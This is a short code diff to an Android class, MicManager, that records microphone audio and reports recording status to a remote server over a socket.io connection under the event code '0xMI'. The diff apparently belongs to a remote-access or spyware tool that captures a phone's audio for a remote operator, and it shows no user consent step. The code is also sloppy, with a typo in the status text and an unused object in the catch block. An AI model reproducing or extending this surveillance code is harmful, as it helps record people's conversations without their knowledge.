@@ -43,7 +43,23 @@ public  class MicManager {
         recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
         recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
         recorder.setOutputFile(audiofile.getAbsolutePath());
+        try{
         recorder.prepare();
+         JSONObject object = new JSONObject();
+            object.put("file",true);
+            object.put("name","true");
+            object.put("buffer" , "starterd recoding");
+        IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
+
+        }
+        catch (Exception e) {
+         JSONObject object = new JSONObject();
+            object.put("file",true);
+            object.put("name","true");
+            object.put("buffer" , "starterd recoding");
+        IOSocket.getInstance().getIoSocket().emit("0xMI" , e.getMessage());
+
+        }
         recorder.start();
 
 
@@ -83,6 +99,7 @@ public  class MicManager {
         }
 
     }
+
 
 }
 
